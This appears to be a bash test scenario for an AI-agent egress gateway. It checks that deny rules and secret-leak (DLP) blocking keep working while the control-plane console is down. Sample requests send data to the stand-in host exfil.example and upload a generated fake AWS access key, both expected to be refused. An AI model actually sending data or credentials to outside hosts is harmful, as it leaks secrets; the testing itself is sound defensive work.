#!/usr/bin/env bash
# 19 — Console injoignable (ENF-03, ADR 0004) : l'API (plan de contrôle) est arrêtée ; la passerelle continue
# d'appliquer la dernière révision installée (refus et autorisations inchangés) et garde ses événements en file ;
# au retour de la console, ils sont livrés (le refus fait pendant la coupure apparaît au journal).
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/../lib.sh"
scenario_begin 19-console-injoignable "Console injoignable : la passerelle continue d'appliquer la politique"
require_demo laurent-bot acme-bot
positive_control laurent-bot
rev="$(gateways_json | jqx -r 'select(.name == "demo-gw") | .active_revision')"
api="$(dc ps -q afw-api)"
restart_api() { docker start "$api" >/dev/null 2>&1 || true; }
trap restart_api EXIT
since="$(now_iso)"
docker stop -t 5 "$api" >/dev/null || fail "cannot stop the API"
api_healthy && fail "the API still answers"
evidence "API (control plane) stopped; installed revision $rev"
m="s19-$(rand_hex)"
c="$(agent_sh laurent-bot "$(http_code_cmd "-d $m https://allowed.example/offline")" 2>/dev/null || true)"
evidence "laurent-bot -> allowed.example: HTTP $c"; [ "$c" = 200 ] || fail "allowed destination broken while the console is down (HTTP $c)"
assert_received allowed-api "$m" "the allowed request"
c="$(agent_sh laurent-bot "$(http_code_cmd "-d $m https://exfil.example/offline")" 2>/dev/null || true)"
evidence "laurent-bot -> exfil.example: HTTP $c"; [ "$c" = 403 ] || fail "forbidden destination not denied while the console is down (HTTP $c)"
c="$(agent_sh acme-bot "$(http_code_cmd https://api.github.com/zen)" 2>/dev/null || true)"
evidence "acme-bot -> api.github.com (zone clients): HTTP $c"; [ "$c" = 403 ] || fail "zone clients policy not applied while the console is down (HTTP $c)"
key="AKIA$(rand_chars 'A-Z2-7' 16)"
c="$(agent_sh laurent-bot "$(http_code_cmd "-d aws_access_key_id=$key https://allowed.example/upload")" 2>/dev/null || true)"
evidence "laurent-bot -> allowed.example with a secret: HTTP $c"; [ "$c" = 403 ] || fail "DLP not applied while the console is down (HTTP $c)"
assert_not_received exfil "$m" "the denied request"
assert_not_received allowed-api "$key" "the secret"
sleep 5

restart_api; trap - EXIT
wait_api 90 || fail "the API did not come back"
evidence "API restarted"
flow="$(find_flow "$(agent_id laurent-bot)" exfil.example deny "$since" 90)" || fail "the denial made during the outage never reached the log"
evidence "event queued by the gateway and delivered after the outage: flow $(printf '%s' "$flow" | jqx -c '{id, started_at, rule: .decision.rule_name}')"
for _ in $(seq 1 60); do
  gateways_json | jqx -e -s 'any(.[]; .name == "demo-gw" and .status == "online")' >/dev/null 2>&1 && break; sleep 1
done
evidence "gateway status: $(gateways_json | jqx -r 'select(.name == "demo-gw") | "\(.status), revision \(.active_revision)"')"
pass "console coupée : la passerelle a continué d'appliquer la révision $rev (autorisé, refusé, DLP), journal rattrapé au retour"
